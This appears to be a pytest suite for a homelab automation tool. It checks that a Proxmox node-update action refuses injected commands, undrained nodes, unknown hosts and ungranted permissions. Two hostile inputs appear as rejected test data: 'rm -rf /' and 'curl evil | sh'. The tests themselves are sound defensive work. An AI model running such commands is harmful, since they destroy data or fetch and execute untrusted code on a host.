"""Update orchestration (Phase 8) — the first Phase-8 write path.

``node-update`` is the first action whose inverse does not exist, and the first
whose write is a command rather than an API call. The load-bearing assertions:
the manifest can never carry a command, an undrained node is refused before any
write, the rollback strategy says plainly that there is none, and the action
kind can never be auto-promoted.
"""

from __future__ import annotations

from typing import Any

import pytest

from homelab_helper.adapters.kernel_ssh import CommandResult
from homelab_helper.db.base import Base
from homelab_helper.db.enums import AutonomyLevel, ProposalOutcome, TrustDomain
from homelab_helper.db.models import ExecutionReceipt, Host, ProposalLog
from homelab_helper.db.session import make_engine, make_sessionmaker, session_scope
from homelab_helper.engine.escalation import REVERSIBLE_ACTION_KINDS, is_promotable
from homelab_helper.engine.executor import (
    ExecutionRefused,
    ManifestError,
    execute_proposal,
    parse_manifest,
)
from homelab_helper.engine.manifest import ManifestError as AuthoringError
from homelab_helper.engine.manifest import build_node_artifact, validate_artifact
from homelab_helper.engine.rollback import NO_INVERSE, RollbackError, RollbackPlan, restore
from homelab_helper.engine.trust import grant_cell, seed_domains

NODE = "bmax1"


# ---------------------------------------------------------------- authoring


def test_a_node_artifact_names_a_node_and_nothing_else() -> None:
    artifact = build_node_artifact(node=NODE)
    assert artifact["action"]["target"] == {"node": NODE}
    assert artifact["action"]["domain"] == TrustDomain.HOST_OS.value
    assert artifact["action"]["action_kind"] == "node-update"


def test_the_rollback_spec_is_fixed_at_no_inverse() -> None:
    artifact = build_node_artifact(node=NODE)
    assert artifact["rollback"] == {"verified": False, "strategy": NO_INVERSE}


def test_a_manifest_can_never_carry_a_command() -> None:
    """The whole safety case: what a node action runs is fixed in code."""
    raw = build_node_artifact(node=NODE)
    raw["action"]["target"]["command"] = "rm -rf /"
    with pytest.raises(AuthoringError, match="command"):
        validate_artifact(raw)


def test_a_node_action_must_declare_the_host_os_domain() -> None:
    raw = build_node_artifact(node=NODE)
    raw["action"]["domain"] = TrustDomain.CONTAINERS.value
    with pytest.raises(AuthoringError):
        validate_artifact(raw)


def test_a_guest_action_kind_is_not_a_node_action() -> None:
    raw = build_node_artifact(node=NODE)
    raw["action"]["action_kind"] = "restart"
    with pytest.raises(AuthoringError):
        validate_artifact(raw)


# ------------------------------------------------------------------ parsing


def proposal_for(node: str = NODE, **overrides: Any) -> ProposalLog:
    artifact = build_node_artifact(node=node)
    artifact["action"].update(overrides)
    return ProposalLog(
        title=f"Update {node}",
        artifact=artifact,
        blast_radius="single-host",
        proposed_by="playbook:node-update",
    )


def test_the_executor_parses_a_node_target() -> None:
    manifest = parse_manifest(proposal_for())
    assert manifest.is_node
    assert manifest.node == NODE
    assert manifest.vmid is None
    assert manifest.cell_key == "host-os/node-update/single-host"
    assert manifest.target_label == f"node {NODE}"


def test_the_executor_refuses_extra_target_fields() -> None:
    """Belt and braces: the executor re-validates untrusted input itself."""
    p = proposal_for()
    p.artifact["action"]["target"]["command"] = "curl evil | sh"
    with pytest.raises(ManifestError, match="only 'node'"):
        parse_manifest(p)


def test_a_node_target_is_not_mistaken_for_a_guest() -> None:
    manifest = parse_manifest(proposal_for())
    assert not manifest.is_workload
    assert not manifest.is_argocd
    assert not manifest.is_dns


# ----------------------------------------------------------------- rollback


async def test_the_rollback_verifier_says_there_is_no_inverse() -> None:
    from homelab_helper.engine.rollback import verify_rollback

    manifest = parse_manifest(proposal_for())
    verification = await verify_rollback(_proxmox([]), manifest)
    assert verification.strategy == NO_INVERSE
    assert not verification.verified
    assert "no inverse" in verification.evidence
    assert "backup" in verification.evidence


async def test_restore_refuses_rather_than_pretending() -> None:
    plan = RollbackPlan(
        strategy=NO_INVERSE,
        verified=False,
        evidence="",
        state={},
        captured_at="",
        node=NODE,
        vmid=None,
        vm_kind=None,
    )
    with pytest.raises(RollbackError, match="nothing to restore"):
        await restore(_proxmox([]), plan)


def test_node_update_can_never_be_auto_promoted() -> None:
    """Not reversible, so the escalation ladder must never lift it."""
    assert "node-update" not in REVERSIBLE_ACTION_KINDS
    assert not is_promotable("node-update", "single-host")


# ------------------------------------------------------------------ dispatch


class _FakeProxmox:
    def __init__(self, guests: list[dict[str, Any]]) -> None:
        self._guests = guests
        self.calls: list[str] = []

    async def cluster_resources(self, kind: str) -> list[dict[str, Any]]:
        self.calls.append(f"cluster_resources:{kind}")
        return self._guests

    async def vm_current_status(self, *a: Any, **k: Any) -> dict[str, Any]:
        return {}


def _proxmox(guests: list[dict[str, Any]]) -> Any:
    return _FakeProxmox(guests)


class _FakeSSH:
    def __init__(self, *, exit_code: int = 0, stdout: str = "0 upgraded") -> None:
        self.calls: list[dict[str, Any]] = []
        self._exit_code, self._stdout = exit_code, stdout

    async def apt_dist_upgrade(self, host: str, **kw: Any) -> CommandResult:
        self.calls.append({"host": host, **kw})
        return CommandResult(
            command="dist-upgrade", stdout=self._stdout, stderr="", exit_code=self._exit_code
        )


@pytest.fixture
async def sessionmaker_():
    engine = make_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    yield make_sessionmaker(engine)
    await engine.dispose()


async def seeded(session, *, credentials: str | None = "ssh:root:/root/.ssh/id_ed25519") -> None:
    await seed_domains(session)
    session.add(Host(hostname=NODE, primary_ip="10.0.6.21", credentials_ref=credentials))
    await grant_cell(
        session,
        TrustDomain.HOST_OS,
        "node-update",
        "single-host",
        AutonomyLevel.CONFIRM,
        actor="enoch",
    )
    await session.flush()


async def _yes(manifest: Any, decision: Any) -> bool:
    return True


async def test_a_drained_node_updates(sessionmaker_) -> None:
    ssh = _FakeSSH()
    async with session_scope(sessionmaker_) as s:
        await seeded(s)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox([]), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )

    assert result.outcome == "succeeded"
    assert len(ssh.calls) == 1
    assert ssh.calls[0]["host"] == "10.0.6.21", "the recorded address, not the node name"
    assert ssh.calls[0]["user"] == "root"
    assert ssh.calls[0]["key_path"] == "/root/.ssh/id_ed25519"


async def test_an_undrained_node_is_refused_before_any_write(sessionmaker_) -> None:
    """The precondition is the point: no partial update under live guests."""
    ssh = _FakeSSH()
    running = [
        {"node": NODE, "vmid": 101, "name": "web01", "status": "running", "template": False},
        {"node": NODE, "vmid": 102, "name": "db01", "status": "running", "template": False},
    ]
    async with session_scope(sessionmaker_) as s:
        await seeded(s)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox(running), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )

        assert result.outcome == "failed"
        assert "drain it first" in (result.error or "")
        assert ssh.calls == [], "nothing ran on the node"
        assert p.outcome is ProposalOutcome.PENDING, "still retryable once drained"


async def test_stopped_guests_do_not_block_an_update(sessionmaker_) -> None:
    ssh = _FakeSSH()
    stopped = [{"node": NODE, "vmid": 101, "status": "stopped", "template": False}]
    async with session_scope(sessionmaker_) as s:
        await seeded(s)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox(stopped), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )
    assert result.outcome == "succeeded"
    assert len(ssh.calls) == 1


async def test_guests_on_another_node_do_not_block(sessionmaker_) -> None:
    ssh = _FakeSSH()
    elsewhere = [{"node": "bmax2", "vmid": 201, "status": "running", "template": False}]
    async with session_scope(sessionmaker_) as s:
        await seeded(s)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox(elsewhere), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )
    assert result.outcome == "succeeded"


async def test_a_failing_upgrade_is_a_failed_receipt(sessionmaker_) -> None:
    ssh = _FakeSSH(exit_code=100, stdout="E: dpkg was interrupted")
    async with session_scope(sessionmaker_) as s:
        await seeded(s)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox([]), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )
        assert result.outcome == "failed"
        assert "exited 100" in (result.error or "")
        receipt = await s.get(ExecutionReceipt, result.receipt_id)
        assert receipt.outcome == "failed"


async def test_an_unknown_host_is_refused(sessionmaker_) -> None:
    ssh = _FakeSSH()
    async with session_scope(sessionmaker_) as s:
        await seed_domains(s)
        await grant_cell(
            s,
            TrustDomain.HOST_OS,
            "node-update",
            "single-host",
            AutonomyLevel.CONFIRM,
            actor="enoch",
        )
        p = proposal_for(node="ghost")
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox([]), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )
    assert result.outcome == "failed"
    assert "not a known host" in (result.error or "")
    assert ssh.calls == []


async def test_a_host_without_credentials_is_refused(sessionmaker_) -> None:
    ssh = _FakeSSH()
    async with session_scope(sessionmaker_) as s:
        await seeded(s, credentials=None)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(
            s, p, _proxmox([]), actor="enoch", confirm_cb=_yes, ssh_adapter=ssh
        )
    assert result.outcome == "failed"
    assert "credentials_ref" in (result.error or "")
    assert ssh.calls == []


async def test_without_an_ssh_adapter_nothing_runs(sessionmaker_) -> None:
    async with session_scope(sessionmaker_) as s:
        await seeded(s)
        p = proposal_for()
        s.add(p)
        await s.flush()
        result = await execute_proposal(s, p, _proxmox([]), actor="enoch", confirm_cb=_yes)
    assert result.outcome == "failed"
    assert "needs one" in (result.error or "")


async def test_an_ungranted_cell_never_reaches_the_node(sessionmaker_) -> None:
    ssh = _FakeSSH()
    proxmox = _proxmox([])
    async with session_scope(sessionmaker_) as s:
        await seed_domains(s)
        s.add(Host(hostname=NODE, primary_ip="10.0.6.21", credentials_ref="ssh:root:/k"))
        p = proposal_for()
        s.add(p)
        await s.flush()
        with pytest.raises(ExecutionRefused, match="propose"):
            await execute_proposal(s, p, proxmox, actor="enoch", confirm_cb=_yes, ssh_adapter=ssh)
    assert ssh.calls == []
    assert proxmox.calls == [], "a refused action never even lists the guests"


# ------------------------------------------------------------------ playbook


async def test_the_playbook_drafts_an_update_from_a_pending_updates_finding(
    sessionmaker_,
) -> None:
    from homelab_helper.db.enums import FindingKind, FindingSeverity, FindingStatus
    from homelab_helper.db.models import ReconciliationFinding
    from homelab_helper.engine.playbooks import playbook_for

    finding = ReconciliationFinding(
        kind=FindingKind.VERSION_DRIFT,
        severity=FindingSeverity.MEDIUM,
        fingerprint="n" * 16,
        title=f"{NODE}: 123 package update(s) pending",
        description="package lag",
        affected=[{"target_type": "host", "target_id": NODE}],
        evidence_refs=[
            {"type": "category", "category": "pve-updates"},
            {"type": "evidence", "pending": 123},
        ],
        status=FindingStatus.OPEN,
    )
    playbook = playbook_for(finding)
    assert playbook is not None
    assert playbook.name == "node-update"

    draft = playbook.build(finding)
    assert draft is not None
    assert draft.artifact["action"]["target"] == {"node": NODE}
    assert "123 package(s)" in draft.title
    assert "Drain the node first" in draft.summary
    assert "no rollback" in draft.summary


def test_the_playbook_ignores_a_mixed_versions_finding() -> None:
    """A cluster-wide version split is fixed by updating each node, which the
    per-node draft already covers; drafting on the cluster row would duplicate."""
    from homelab_helper.db.enums import FindingKind, FindingSeverity, FindingStatus
    from homelab_helper.db.models import ReconciliationFinding
    from homelab_helper.engine.playbooks import playbook_for

    finding = ReconciliationFinding(
        kind=FindingKind.VERSION_DRIFT,
        severity=FindingSeverity.MEDIUM,
        fingerprint="m" * 16,
        title="homelab: nodes report different versions",
        description="mixed",
        affected=[{"target_type": "host", "target_id": NODE}],
        evidence_refs=[{"type": "category", "category": "pve-mixed"}],
        status=FindingStatus.OPEN,
    )
    playbook = playbook_for(finding)
    assert playbook is not None, "the kind and target match"
    assert playbook.build(finding) is None, "but this category drafts nothing"
